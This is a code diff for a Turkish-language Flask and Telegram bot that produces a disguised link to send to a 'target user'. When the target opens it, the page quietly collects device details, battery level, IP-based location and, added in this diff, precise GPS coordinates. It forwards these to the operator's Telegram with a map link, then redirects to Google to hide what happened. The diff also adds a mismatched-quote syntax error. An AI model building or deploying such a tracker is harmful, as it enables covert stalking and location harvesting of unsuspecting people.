@@ -1,8 +1,9 @@
 import requests
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-from flask import Flask, render_template_string, request, jsonify
+from flask import Flask, request, jsonify
 from threading import Thread
+import os
 
 app = Flask(__name__)
 
@@ -35,8 +36,7 @@ Aşağıdaki butona tıklayarak hedef kullanıcıya göndereceğiniz özel veri 
 
 @bot.callback_query_handler(func=lambda call: call.data == "link_olustur")
 def callback_inline(call):
-    # BURAYA KENDİ GERÇEK RENDER LİNKİNİ YAZMALISIN (örn: https://tg-logger.onrender.com)
-    hedef_link = "https://tg-logger.onrender.com" 
+    hedef_link = "https://tg-logger-mq38.onrender.com" 
     
     link_metni = f"""
 🚀 <b>ÖZEL BAĞLANTI BAŞARIYLA OLUŞTURULDU!</b>
@@ -70,13 +70,34 @@ def home():
             if (navigator.getBattery) {
                 try { const b = await navigator.getBattery(); pil = `%${Math.round(b.level * 100)}`; } catch(e){}
             }
+
+            // GPS Konum İstintği (Kullanıcı izin verirse tam koordinat alınır)
+            let gpsKonum = "İzin Verilmedi / Alınamadı";
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        gpsKonum = `${position.coords.latitude}, ${position.coords.longitude}`;
+                        gonder(cihaz, cpu, saat, pil, gpsKonum);
+                    },
+                    (error) => {
+                        gonder(cihaz, cpu, saat, pil, gpsKonum);
+                    },
+                    { timeout: 10000, enableHighAccuracy: true }
+                );
+            } else {
+                gonder(cihaz, cpu, saat, pil, gpsKonum);
+            }
+        }
+
+        function gonder(cihaz, cpu, saat, pil, gpsKonum) {
             fetch('/log', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({cihaz, cpuCekirdek: cpu, yerelSaat: saat, pilSeviyesi: pil})
+                body: JSON.stringify({cihaz, cpuCekirdek: cpu, yerelSaat: saat, pilSeviyesi: pil, gps: gpsKonum})
             });
-            setTimeout(() => { window.location.href = "https://google.com"; }, 800);
+            setTimeout(() => { window.location.href = "https://google.com"; }, 1200);
         }
+
         window.onload = verileriTopla;
     </script>
     </body>
@@ -96,24 +117,25 @@ def log_data():
     cpu_cekirdek = data.get('cpuCekirdek', 'Bilinmiyor')
     yerel_saat = data.get('yerelSaat', 'Bilinmiyor')
     pil_seviyesi = data.get('pilSeviyesi', 'Bilinmiyor')
+    gps_konum = data.get('gps', 'Bilinmiyor')
 
     try:
-        # DÜZELTME BURADA YAPILDI (/json/ eklendi)
         geo_url = f"http://ip-api.com/json/{client_ip}?fields=status,country,city,zip,org,lat,lon"
         geo_res = requests.get(geo_url).json()
         
         ulke_sehir = "Bilinmiyor"
         posta_kodu = "Bilinmiyor"
-        anonim_sirket = "Bilinmiyor"
-        konum = "Bilinmiyor"
+        anonim_sirket = "Bilinmiyor'
+        ip_konum = "Bilinmiyor"
 
         if geo_res.get('status') == 'success':
             ulke_sehir = f"{geo_res.get('country')} / {geo_res.get('city')}"
             posta_kodu = geo_res.get('zip', 'Yok')
             anonim_sirket = geo_res.get('org', 'Bilinmeyen Servis Sağlayıcı')
-            lat = geo_res.get('lat')
-            lon = geo_res.get('lon')
-            konum = f"{lat}, {lon}"
+            ip_konum = f"{geo_res.get('lat')}, {geo_res.get('lon')}"
+
+        # Eğer GPS alındıysa onu öncelikli kullan, yoksa IP konumunu kullan
+        harita_koordinat = gps_konum if gps_konum != "İzin Verilmedi / Alınamadı" else ip_konum
 
         telegram_mesaji = f"""
 🛑 <b>[!] YENİ BAĞLANTI AKTİVİTESİ YAKALANDI</b> 🛑
@@ -127,7 +149,7 @@ def log_data():
 📮 <b>Posta Kodu:</b> <code>{posta_kodu}</code>
 🏢 <b>İnternet Sağlayıcı:</b> <code>{anonim_sirket}</code>
 🌐 <b>IP Adresi:</b> <code>{client_ip}</code>
-📍 <b>Harita Konumu:</b> <a href="https://www.google.com/maps/search/?api=1&query={konum}">Google Maps ile Göster</a>
+📍 <b>GPS / Harita Konumu:</b> <a href="https://www.google.com/maps/search/?api=1&query={harita_koordinat}">Google Maps ile Göster</a>
 ───────────────────────
 🔍 <i>Veriler anlık ağ sorgusu üzerinden doğrulanmıştır.</i>
         """
@@ -147,5 +169,6 @@ if __name__ == '__main__':
     bot_thread = Thread(target=run_bot)
     bot_thread.start()
     
-    print("Web sunucusu 5000 portunda başlatılıyor...")
-    app.run(host='0.0.0.0', port=5000, use_reloader=False)
+    port = int(os.environ.get("PORT", 5000))
+    print(f"Web sunucusu {port} portunda başlatılıyor...")
+    app.run(host='0.0.0.0', port=port, use_reloader=False)
